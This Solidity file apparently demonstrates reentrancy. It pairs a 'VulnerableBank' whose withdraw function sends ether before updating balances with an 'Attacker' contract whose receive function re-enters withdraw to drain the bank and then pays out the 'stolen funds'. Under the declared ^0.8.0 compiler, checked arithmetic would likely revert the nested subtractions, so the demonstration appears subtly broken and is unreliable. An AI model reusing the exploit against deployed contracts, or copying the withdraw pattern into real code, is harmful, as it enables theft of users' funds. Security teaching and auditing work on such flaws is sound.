// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be positive");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerable point: state update happens after external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
        emit Withdraw(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    VulnerableBank public bank;
    uint256 public attackAmount;
    bool public isAttacking;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    function deposit() external payable {
        require(msg.value > 0, "Deposit amount must be positive");
        bank.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        isAttacking = true;
        bank.withdraw(amount);
        isAttacking = false;
    }

    receive() external payable {
        if (isAttacking && address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }

    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}